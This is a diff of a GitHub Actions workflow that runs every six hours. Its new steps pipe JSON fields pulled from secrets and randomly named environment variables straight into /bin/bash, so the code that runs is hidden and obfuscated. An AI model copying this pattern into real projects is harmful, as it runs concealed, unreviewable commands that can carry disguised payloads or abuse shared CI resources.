@@ -1,10 +1,10 @@
 name: wangyinzi1234
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 2/6 * * *'
-jobs:  # 20522
+    - cron: '38 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,9 +12,11 @@ jobs:  # 20522
       - uses: actions/checkout@v4
       - name: wangyinzi1234
         env:
-          ax98524: ${{ secrets.ax98524 }}
+          uvr7606: ${{ secrets.uvr7606 }}
         run: |
-          echo $ax98524 | jq -r .vq5797 | /bin/bash
-          echo $rp71 | jq -r .rkxx00449 | /bin/bash
-          echo $rmioh03589 | jq -r .hd6211 | /bin/bash
+          echo $uvr7606 | jq -r .sop8960 | /bin/bash
+          echo $h70 | jq -r .d283 | /bin/bash
+          echo $rwx9 | jq -r .esul827 | /bin/bash
+          echo $j447 | jq -r .gskav4 | /bin/bash
+          echo $f13 | jq -r .aug76625 | /bin/bash
 
